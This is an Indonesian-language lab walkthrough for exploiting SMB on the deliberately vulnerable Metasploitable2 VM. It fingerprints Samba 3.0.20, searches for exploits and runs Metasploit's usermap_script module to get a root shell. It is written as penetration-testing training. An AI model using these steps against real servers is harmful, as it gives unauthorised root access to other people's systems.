# Exploit port 139 dan 445 (SMB)
- Buka msfconsole di terminal
```sh
msfconsole
```

- Gunakan modul `auxiliary/scanner/smb/smb_version` untuk mengetahui versi samba yang digunakan di server
```sh
use auxiliary/scanner/smb/smb_version
```

- Tampilkan daftar parameter yang dibutuhkan di modul tersebut. Disini kita hanya perlu mengisi parameter `RHOSTS` saja
```sh
show options
```

- Isi parameter `RHOST` dengan IP metasploitable2
```sh
set RHOST <IP_metasploitable2>
```

- Jalankan modul tersebut. Disini didapat informasi bahwa file server yang digunakan adalah samba versi `3.0.20`
```sh
exploit
```

- Buka terminal baru gunakan tool searchsploit untuk mencari kelemahan samba versi `3.0.20`
```sh
searchsploit samba
```

- Buka kembali tool metasploit dan lakukan pencarian modul exploit untuk samba
```sh
search samba
```

- Disini kita gunakan modul `exploit/multi/samba/usermap_script` yang ada di list nomor 8 dari hasil pencarian
```sh
use <nomor_modul>
```

- Tampilkan daftar parameter yang dibutuhkan di modul tersebut. Disini kita hanya perlu mengisi parameter `RHOSTS` saja
```sh
show options
```

- Isi parameter `RHOST` dengan IP metasploitable2
```sh
set RHOST <IP_metasploitable2>
```


- Jalankan modul tersebut. Setelah dijalankan, exploit berhasil mengakses masuk ke dalam server. Jika diketik perintah whoami maka kita berhasil masuk sebagai user root
```sh
exploit
```